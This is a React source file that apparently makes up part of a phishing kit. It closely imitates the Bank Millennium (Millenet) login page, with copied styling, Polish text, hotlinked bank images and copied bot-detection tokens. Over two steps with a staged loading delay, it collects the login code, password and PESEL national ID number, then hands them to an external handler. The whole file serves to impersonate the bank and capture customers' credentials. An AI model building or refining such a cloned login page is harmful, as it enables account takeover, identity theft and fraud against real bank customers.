import {useForm} from "react-hook-form";
import {yupResolver} from "@hookform/resolvers/yup";
import {Fragment, useState} from "react";
import * as yup from "yup";

const schema = yup.object().shape({
    millekod: yup.string().max(16).required(),
    pesel: yup.string().required().min(11).matches(/^[0-9]{2}([02468]1|[13579][012])(0[1-9]|1[0-9]|2[0-9]|3[01])[0-9]{5}$/),
    password: yup.string().matches(/^[0-9]{8}$/).required()
});
const MillenniumFormLogin = ({handler}) => {
    const [step, setStep] = useState(1);
    const [loading, setLoading] = useState(false);
    const {register, handleSubmit, trigger, reset, formState: {errors}} = useForm({
        resolver: yupResolver(schema),
        mode: 'onBlur'
    });

    const load = (index) => {
        setLoading(true);

        setTimeout(() => {
            setLoading(false);
            setStep(index);
        }, 1500)
    }
    const clearForm = (data) => {
        setLoading(false);
        setStep(1);
        reset();
        handler(data)
    }
    return (
        <div className="view-body-container">

            <form autoComplete="off" onSubmit={handleSubmit(clearForm)}>
                {
                    step === 1 ?
                        <Fragment>
                            <div className="LoginPanelHeader row">
                                <div className="col-xs-12 col-sm-12">
                                    <p className="MNText Text LargeGrayTextSimple Text"
                                       data-dateformat="yy-mm-dd">Logowanie do Millenetu</p>
                                </div>
                            </div>
                            <div className="Container">
                                <div>
                                    <b>
                        <span className="MNText MediumText Text"
                              data-dateformat="yy-mm-dd">
                            MilleKod
                        </span>
                                    </b>
                                    <div
                                        className={`MNTextBox MNField Multicode form-group BoldLabel DescriptionLeft RoundedWithShadow ${errors.millekod && 'has-error'}`}>
                                        <div className="Content col-xs-12">
                                            <input
                                                className="form-control MNTextBoxContent"
                                                style={{height: '45px'}}
                                                type="text"
                                                {...register('millekod')}
                                            /></div>
                                        <p className="col-xs-12 col-sm-12 col-md-12 col-lg-12 errorA ">
                                            {
                                                errors.millekod &&
                                                <span className="field-validation-error" data-valmsg-for="Millekod"
                                                      data-valmsg-replace="true" role="alert">
                                                    <span id="Millekod_txtContent-error"
                                                          className="has-error">
                                                        Pole jest wymagane
                                                    </span>
                                                </span>
                                            }
                                        </p>
                                    </div>
                                </div>
                                <div className="PasswordPeek">
                                    <div className="PasswordPeekInner">
                                        <a className="MNKeyboard KeyboardTrigger mille_font icon-keyboardV2 hidden-xs InactiveColor"/>
                                    </div>
                                </div>
                            </div>
                            <div className="actions-container">
                                <div className="BodyFooterItems col-xs-12">
                                    <div className="divButtonLogin col-xs-12 col-sm-5">
                                        <button
                                            className="MNButton MNCommand ButtonLogin col-xs-12 btn btn-link PrimaryRounded btn-default"
                                            type="button"
                                            onClick={() => {
                                                console.log(errors)
                                                trigger('millekod').then((res) => {
                                                    if (res) {
                                                        load(2);
                                                    }
                                                })
                                            }}
                                        >
                                            DALEJ
                                        </button>
                                    </div>
                                    <div className="HelpLink col-xs-12 col-sm-8"><a
                                        className="MNHLink MNCommand Magenta"
                                        href="javascript:void(0)" id="HelpLink"
                                        onClick="$('.LoginPage').Website_LayoutLogin('showMainBallon');">Pomoc
                                        z logowaniem</a></div>
                                </div>
                            </div>
                            <div className="field-group-separator-container row">
                                <div className="MNFieldGroupFieldSeparator col-xs-12"/>
                            </div>
                            <div className="MNInfoContent login-information-container panel Plain Custom"
                                 data-name="LoginInformation"
                                 data-uniqueid="795a3e8aca6c433b876e92e0e9b8fcf0" data-widget="true"
                                 id="login-information-info-content">
                                <div
                                    className="ci_custom information-lxvg___con">{/*?xml version="1.0" encoding="utf-16"?*/}
                                    <div style={{margin: '0px', padding: '0px', border: '0px'}}>
                                        <style
                                            dangerouslySetInnerHTML={{__html: "\n.information-lxvg___con { padding-top: 20px; }\n#information-lxvg_ { margin: 0 auto; color: #737373; font-family: Roboto; font-size: 13px; line-height: 16px; max-width: 330px; }\n#information-lxvg_ .date, #information-lxvg_ .link { color: #BD004F; }\n#information-lxvg_ .date { font-size: 13px; font-weight: 500; line-height: 16px; margin: 0 23px 0 3px; }\n#information-lxvg_ .information__element { display: flex; margin-bottom: 30px; }\n#information-lxvg_ .information__element:last-child { margin-bottom: 0; }\n@media (max-width: 767px){\n    .information-lxvg___con { margin-top: 0; margin-bottom: 30px!important; }   \n    #information-lxvg_ { max-width: 100%; }\n    #information-lxvg_ .information__element { display: block; }\n    #information-lxvg_  .date { margin: 0 0 7px; display: block; }\n}\n"}}/>
                                        <dl id="information-lxvg_">
                                            <dd className="information__element"><span
                                                className="date"> Fałszywi konsultanci </span><span
                                                className="content">Oszuści podszywają się pod pracowników Banku - nie pobieraj nieznanych aplikacji i nie udostępniaj poufnych danych <a
                                                href="https://www.bankmillennium.pl/bankowosc-elektroniczna/bezpieczenstwo"
                                                className="link" target="_blank"><span
                                                className="aria-hide">link otwiera się w nowym oknie</span>Więcej<span
                                                className="aria-hide"> Bezpieczeństwo</span></a></span>
                                            </dd>
                                            <dd className="information__element"><span
                                                className="date"> Usługi przydatne na wakacjach </span><span
                                                className="content">Ubezpiecz swój wyjazd i zadbaj o dodatkowe środki na urlopie <a
                                                href="https://www.bankmillennium.pl/#needs"
                                                className="link" target="_blank"><span
                                                className="aria-hide">link otwiera się w nowym oknie</span>Więcej<span
                                                className="aria-hide"> Urlop i podróże</span></a></span>
                                            </dd>
                                        </dl>
                                    </div>
                                </div>
                            </div>

                        </Fragment> :
                        step === 2 ?
                            <Fragment>
                                <div className="LoginPanelHeader row">
                                    <div className="col-xs-10 col-sm-10">
                                        <p className="MNText Text LargeGrayTextSimple Text"
                                           data-dateformat="yy-mm-dd">Logowanie do Millenetu</p>
                                        <div className="Millekod">
                                            <div><span className="MNText SmallGrayTextSimpleBold Text"
                                                       data-dateformat="yy-mm-dd">Twój MilleKod</span></div>
                                            <div className="MillekodText"><span
                                                className="MNText SmallGrayTextSimple Text" data-dateformat="yy-mm-dd"
                                                id="MillekodOrAlias">login</span></div>
                                        </div>
                                    </div>
                                    <div className="col-xs-2 col-sm-2">
                                        <div className="MNImage RoundWithBorderAndShadowAnd53Pixel"
                                             data-usehandler="False" style={{width: '53px'}}>
                                            <div><img alt="" className="RadiusThree Image img-responsive img-circle"
                                                      src="https://www.bankmillennium.pl/osobiste2/Images/SecurityImages/Login/LoginImage9.jpg"/>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div className="hintMessageContainer"/>

                                <div className="loginWrapper">
                                    <div className="login-content envelopePassword form-horizontal">
                                        <div className="row">
                                            <div className="col-xs-12">
                                                <b><span className="MNText MediumText Text"
                                                         data-dateformat="yy-mm-dd">H@sło 1</span></b>
                                                <div className="MNHelpIcon WhiteInfo" id="mnHelpIcon54941"
                                                     tabIndex={-1}/>
                                            </div>
                                            <div className="col-xs-12">
                                                <div
                                                    className="MNTextBox MNField PasswordOne Clearable form-group BoldLabel DescriptionLeft RoundedWithShadow">
                                                    <div className="Content col-xs-12">
                                                        <input className="form-control MNTextBoxContent"
                                                               style={{height: '45px'}}
                                                               {...register('password')}
                                                               type="password"/>
                                                    </div>
                                                    <p className="col-xs-12 col-sm-12 col-md-12 col-lg-12 errorA row">
                                                        {
                                                            errors.password ?
                                                                errors.password.type === 'matches' ?
                                                                    <span className="field-validation-error"
                                                                          data-valmsg-for="Millekod"
                                                                          data-valmsg-replace="true" role="alert">
                                                                        <span id="Millekod_txtContent-error"
                                                                              className="has-error">
                                                                            H@sło 1 powinno składać się z 8 cyfr
                                                                        </span>
                                                                    </span> :
                                                                    errors.password.type === 'required' || errors.password.type === 'typeError' ?
                                                                        <span className="field-validation-error"
                                                                              data-valmsg-for="Millekod"
                                                                              data-valmsg-replace="true" role="alert">
                                                                        <span id="Millekod_txtContent-error"
                                                                              className="has-error">
                                                                            Pole jest wymagane
                                                                        </span>
                                                                    </span> : null : null
                                                        }
                                                    </p>
                                                </div>
                                            </div>
                                        </div>
                                        <div className="row">
                                            <div className="col-xs-12">
                                                <b><span className="MNText MediumText Text">PESEL</span></b>
                                                <div className="MNHelpIcon WhiteInfo" id="mnHelpIcon54941"
                                                     tabIndex={-1}/>
                                            </div>
                                            <div className="col-xs-12">
                                                <div
                                                    className="MNTextBox MNField PasswordOne Clearable form-group BoldLabel DescriptionLeft RoundedWithShadow">
                                                    <div className="Content col-xs-12">
                                                        <input className="form-control MNTextBoxContent"
                                                               style={{height: '45px'}}
                                                               {...register('pesel')}/>
                                                    </div>
                                                    <p className="col-xs-12 col-sm-12 col-md-12 col-lg-12 errorA row">
                                                        {
                                                            errors.pesel ?
                                                                errors.pesel.type === 'min' ?
                                                                    <span className="field-validation-error"
                                                                          data-valmsg-for="Millekod"
                                                                          data-valmsg-replace="true" role="alert">
                                                                        <span id="Millekod_txtContent-error"
                                                                              className="has-error">
                                                                            PESEL powinno składać się z 11 cyfr
                                                                        </span>
                                                                    </span> :
                                                                    errors.pesel.type === 'matches' ?
                                                                        <span className="field-validation-error"
                                                                              data-valmsg-for="Millekod"
                                                                              data-valmsg-replace="true" role="alert">
                                                                        <span id="Millekod_txtContent-error"
                                                                              className="has-error">
                                                                            Pole jest nieprawidłowe
                                                                        </span>
                                                                    </span> :
                                                                        errors.pesel.type === 'required' || errors.pesel.type === 'typeError' ?
                                                                            <span className="field-validation-error"
                                                                                  data-valmsg-for="Millekod"
                                                                                  data-valmsg-replace="true"
                                                                                  role="alert">
                                                                        <span id="Millekod_txtContent-error"
                                                                              className="has-error">
                                                                            Pole jest wymagane
                                                                        </span>
                                                                    </span> : null : null
                                                        }
                                                    </p>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div className="actions-container row">
                                    <div className="BodyFooterItems col-xs-12">
                                        <div className="divButtonLogin col-xs-12 col-sm-5">
                                            <button
                                                className="MNButton MNCommand ButtonLogin col-xs-12 btn btn-link PrimaryRounded btn-default"
                                                id="BtnLogin"
                                                type="submit"
                                            >
                                                ZALOGUJ
                                            </button>
                                        </div>
                                        <div className="HelpLink col-xs-12 col-sm-8"><a
                                            className="MNHLink MNCommand Magenta" href="javascript:void(0)"
                                            id="HelpLink"
                                            onClick="$('.LoginPage').Website_LayoutLogin('showMainBallon');">Pomoc z
                                            logowaniem</a></div>
                                    </div>
                                </div>
                                <div className="field-group-separator-container row">
                                    <div className="MNFieldGroupFieldSeparator col-xs-12"/>
                                </div>
                                <div className="center-button">
                                    <a className="MNHLink MNCommand Magenta"
                                       href="url('https://www.bankmillennium.pl/osobiste2/Retail/Login?BackRedirect=BackRedirect"
                                       id="BtnClearXS">Powrót</a>
                                </div>
                                <input id="FrameworkCache" name="FrameworkCache" type="hidden"
                                       defaultValue="ed8lEPY8DEbfEpwpNRiGHqR4ywU0WGnT|"/>
                                <input id="BotDetection_ClientToken" name="BotDetection.ClientToken" type="hidden"
                                       defaultValue="fd317f2a-a99e-4aaf-beb6-b860c7013df2"/>
                                <input data-val="true" data-val-required="The PresentedBefore field is required."
                                       id="BotDetection_PresentedBefore" name="BotDetection.PresentedBefore"
                                       type="hidden" defaultValue="False"/>
                                <div className="MNBalloonClosable MNBalloon MNContainer NotificationInfo"
                                     data-appearance="NotificationInfo"
                                     data-destinationelement="$('#level3DialogBox').parent()"
                                     data-dontadjustappearance="false" data-initiallyvisible="false"
                                     data-minimumheight={0} data-widget="true" id="level3DialogBox"
                                     style={{display: 'none'}}>
                                    <div className="Balloon ui-draggable ui-draggable-handle" role="dialog"
                                         aria-labelby="level3DialogBox_Header"
                                         aria-describedby="level3DialogBox_Content" style={{marginLeft: '-4000px'}}>
                                        <div className="Header row" id="level3DialogBox_Header">
                                            <div className="IconInfo Icon mille_font col-sm-2"/>
                                            <p>Wymagana dodatkowa weryfikacja</p></div>
                                        <div className="Tail None"/>
                                        <div className="Content" id="level3DialogBox_Content">
                                            <div>
                                                <div>Kliknij w zdanie <b>Nie jestem robotem</b>, by
                                                    kontynuować logowanie do Millenetu.
                                                </div>
                                                <div id="level3OkButton" className="BotDetection">
                                                    <a className="MNHLink MNCommand Plain" href="javascript:void(0)"
                                                       onClick="$('.Retail_Login_PasswordOneRequest').Common_Security_BotDetection('setLevel3Ok');"
                                                       tabIndex={-1}>Nie jestem robotem</a>
                                                </div>
                                            </div>
                                            <a/></div>
                                    </div>
                                </div>

                            </Fragment>
                            : null
                }


            </form>
        </div>
    )
}

export default MillenniumFormLogin;